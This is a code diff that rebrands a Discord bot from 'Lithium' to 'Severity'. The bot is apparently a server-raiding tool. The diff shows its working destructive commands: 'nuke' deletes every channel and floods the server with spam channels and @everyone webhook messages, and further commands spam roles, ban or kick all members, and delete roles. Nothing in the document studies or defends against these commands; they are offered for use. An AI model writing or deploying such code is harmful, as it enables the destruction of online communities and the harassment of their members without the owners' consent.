@@ -24,7 +24,7 @@ async def custom_help(ctx):
     custom_color = 0x5564f1  
 
     embed = discord.Embed(
-        title="Lithium Commands",
+        title="Severity Commands",
         description="Here is a list of available commands and their descriptions:",
         color=custom_color  
     )
@@ -73,18 +73,18 @@ async def nuke(ctx):
     Nuke the server.
     """
     await ctx.message.delete()
-    await ctx.guild.edit(name="Lithium Was Here")
+    await ctx.guild.edit(name="Severity Was Here")
 
     await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
 
-    await asyncio.gather(*[ctx.guild.create_text_channel("Lithium Was Here") for _ in range(35)])
+    await asyncio.gather(*[ctx.guild.create_text_channel("Severity Was Here") for _ in range(35)])
 
     for channel in ctx.guild.text_channels:
-        num_webhooks = 5  # Change this to the # of webhooks you want
+        num_webhooks = 5  # change this to the # of webhooks you want
         for _ in range(num_webhooks):
-            webhook = await channel.create_webhook(name=f"Lithium{_}") 
+            webhook = await channel.create_webhook(name=f"Severity{_}") 
             for _ in range(5):
-                await webhook.send(f"@everyone **Lithium Was Here!")       
+                await webhook.send(f"@everyone **Severity Was Here!")       
                 await ctx.send("Nuking the server...")  
 
 @bot.event
@@ -113,7 +113,7 @@ async def rolespam(ctx):
     """
     await ctx.message.delete()
     for i in range(100):
-        await ctx.guild.create_role(name="wizzed by lithium")
+        await ctx.guild.create_role(name="wizzed by severity")
     """
     Spam roles in the server.
     """
@@ -138,7 +138,7 @@ async def banall(ctx):
     try:
         for member in ctx.guild.members:
             if ctx.author.guild_permissions.ban_members and not member.guild_permissions.ban_members:
-                await member.ban(reason="Lithium Was Here")
+                await member.ban(reason="Severity Was Here")
                 print(Fore.GREEN + f"banned {member}")
             else:
                 print(Fore.RED + f"skipping {member} due to permissions")
@@ -157,7 +157,7 @@ async def kickall(ctx):
     """
     try:
         for member in ctx.guild.members:
-            await member.kick(reason="Lithium Was Here")
+            await member.kick(reason="Severity Was Here")
             print(Fore.GREEN + f"kicked {member}")
     except:
         print(Fore.RED + f"cant kick {member}")
@@ -175,7 +175,7 @@ async def delroles(ctx):
     await asyncio.sleep(10)
 
     try:
-        await asyncio.gather(*[role.delete(reason="Roles deleted by Lithium") for role in roles_to_delete])
+        await asyncio.gather(*[role.delete(reason="Roles deleted by Severity") for role in roles_to_delete])
         print(Fore.GREEN + "All roles deleted successfully.")
     except Exception as e:
         print(Fore.RED + f"Error deleting roles: {e}")
